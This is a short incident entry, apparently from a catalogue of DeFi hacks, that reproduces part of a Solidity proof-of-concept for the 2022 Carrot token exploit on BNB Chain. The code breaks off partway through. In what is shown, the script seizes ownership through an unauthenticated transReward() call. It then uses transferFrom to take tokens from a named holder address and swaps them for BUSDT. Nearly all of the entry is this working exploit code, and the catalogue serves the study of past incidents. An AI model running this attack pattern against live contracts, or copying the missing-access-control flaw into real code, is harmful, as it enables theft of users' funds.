# [?] Carrot - Public functionCall

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Carrot
Published: 2022-10-10
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Carrot_exp.sol
Type: defi-exploit-poc

## Details
Lost: 31,318 BUSDT

```solidity
contract ContractTest is Test {
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICarrot constant CARROT_TOKEN = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955); // Binance USDT

    function setUp() public {
        vm.createSelectFork("bsc", 22_055_611);
        // Adding labels to improve stack traces' readability
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(CARROT_TOKEN), "CARROT_TOKEN");
        vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
        vm.label(address(0xF34c9a6AaAc94022f96D4589B73d498491f817FA), "CARROT_BUSDT_PAIR");
        vm.label(address(0x6863b549bf730863157318df4496eD111aDFA64f), "Pool");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker BUSDT balance before exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
        );

        // Call vulnerable transReward() to set this contract as owner. No auth control
        CARROT_TOKEN.transReward(abi.encodeWithSelector(0xbf699b4b, address(this)));

        // Empty transferFrom() called during the exploit. Apparently not needed.
        // CARROT_TOKEN.transferFrom(address(this), address(CARROT_TOKEN), 0);

        // Call transferFrom() to steal CARROT tokens using the same amount used in the exploit
        CARROT_TOKEN.transferFrom(
            0x00B433800970286CF08F34C96cf07f35412F1161, address(this), 310_344_736_073_087_429_864_760
        );

        // Swap all stolen Carrot to BUSDT
        _CARROTToBUSDT();

        emit log_named_decimal_uint(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Carrot_exp.sol_
